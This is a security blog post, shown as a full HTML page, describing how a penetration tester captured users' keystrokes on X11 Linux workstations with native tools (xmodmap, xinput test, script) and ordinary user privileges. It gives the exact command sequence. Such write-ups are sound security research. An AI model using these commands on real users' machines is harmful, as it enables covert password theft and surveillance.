<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>Natively Keylogging *NIX Systems â€“ popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="UNIX, X11, Linux, Keylogging, xinput, Keylogger, Ubuntu, xmodmap"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="Natively Keylogging *NIX Systems"> <meta name="twitter:description" content="I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Natively Keylogging *NIX Systems"> <meta property="og:description" content="I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files."> <meta property="og:url" content="http://localhost:4000/natively-keylogging-nix-systems/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/natively-keylogging-nix-systems/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>Natively Keylogging *NIX Systems | popped.io</title> <meta property="og:title" content="Natively Keylogging *NIX Systems"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files."> <meta property="og:description" content="I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files."> <link rel="canonical" href="http://localhost:4000/natively-keylogging-nix-systems/"> <meta property="og:url" content="http://localhost:4000/natively-keylogging-nix-systems/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2016-06-21T23:32:00-04:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"Natively Keylogging *NIX Systems","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2016-06-21T23:32:00-04:00","dateModified":"2016-06-21T23:32:00-04:00","description":"I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/natively-keylogging-nix-systems/"},"url":"http://localhost:4000/natively-keylogging-nix-systems/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>Natively Keylogging *NIX Systems</h1> <h4>21 Jun 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~1 minute </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>I recently conducted a penetration test for a client that has rich *NIX environment. After obtaining user access to several workstations, it was apparent that access to the interesting areas of the network required retrieving clear text passwords from users password database files.</p> <p>The compromised systems did not have any misconfigurations or service vulnerabilities, so privilege escalation opportunities were few and far between. This makes executing most readily available *NIX keylogger binaries ineffective.</p> <p>I spent some time researching alternative ways to obtain keystrokes and discovered that it is possible to capture users typing directly to the keyboard using xinput. The best part is that this can be achieved with regular user privileges and with native tools.</p> <p>Here is a video as well as some textual steps.</p> <iframe width="560" height="315" src="//www.youtube.com/embed/l09BEQ8FAAo" frameborder="0"> </iframe> <p>I like to create a new screen in situations like this, so the first step is:</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">screen</span> <span class="nt">-S</span> <span class="nt">keylogger</span></code></pre></figure> <p>I then sorted out some X11 display pre-requisites and grabbed the keycode to character legend. This is so that strokes can be translated from a keycode integer value to alphabetical character.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">export</span> <span class="nt">DISPLAY</span><span class="o">=</span><span class="nd">:0</span><span class="nc">.0</span>
<span class="nt">export</span> <span class="o">|</span> <span class="nt">grep</span> <span class="nt">DIS</span>

<span class="nt">xmodmap</span> <span class="nt">-pke</span> <span class="o">&gt;</span> <span class="nt">xmodmap-pke</span><span class="nc">.txt</span></code></pre></figure> <p>Next step was to identify the input ID for the keyboard and use script to capture the real time strokes to file.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">xinput</span> <span class="nt">list</span>

<span class="nt">script</span> <span class="nt">-c</span> <span class="s1">"xinput test 8"</span> <span class="nt">-a</span> <span class="nt">xinput-keylogger</span><span class="nc">.log</span></code></pre></figure> <p>My co-worker <a href="http://porterhau5.com/about/">Tom Porter</a> and I are working on putting together a parser that shifts correctly to account for lowercase and uppercase characters. Some other thoughts are real-time parsing, or slightly delayed parsing so that post-processing is avoided all together.</p> <figure> <center> <img src="https://4.bp.blogspot.com/-UkRf5m_3IjA/V2oEcqvBETI/AAAAAAAACC0/mM6njLJ4fM0ApagSM47W85uwi8WGw2ITQCLcB/s1600/Screen%2BShot%2B2016-06-21%2Bat%2B11.12.24%2BPM.png"> </center> </figure> <p><strong>Update:</strong> Here is a link to the <a href="https://github.com/porterhau5/xkeyscan/blob/master/xkeyscan.py">parser</a> Tom put together.</p> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#UNIX" title="Pages tagged UNIX" class="tag"><span class="term">UNIX</span></a><a href="http://localhost:4000/tags/#X11" title="Pages tagged X11" class="tag"><span class="term">X11</span></a><a href="http://localhost:4000/tags/#Linux" title="Pages tagged Linux" class="tag"><span class="term">Linux</span></a><a href="http://localhost:4000/tags/#Keylogging" title="Pages tagged Keylogging" class="tag"><span class="term">Keylogging</span></a><a href="http://localhost:4000/tags/#xinput" title="Pages tagged xinput" class="tag"><span class="term">xinput</span></a><a href="http://localhost:4000/tags/#Keylogger" title="Pages tagged Keylogger" class="tag"><span class="term">Keylogger</span></a><a href="http://localhost:4000/tags/#Ubuntu" title="Pages tagged Ubuntu" class="tag"><span class="term">Ubuntu</span></a><a href="http://localhost:4000/tags/#xmodmap" title="Pages tagged xmodmap" class="tag"><span class="term">xmodmap</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/natively-keylogging-nix-systems/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/natively-keylogging-nix-systems/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/natively-keylogging-nix-systems/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
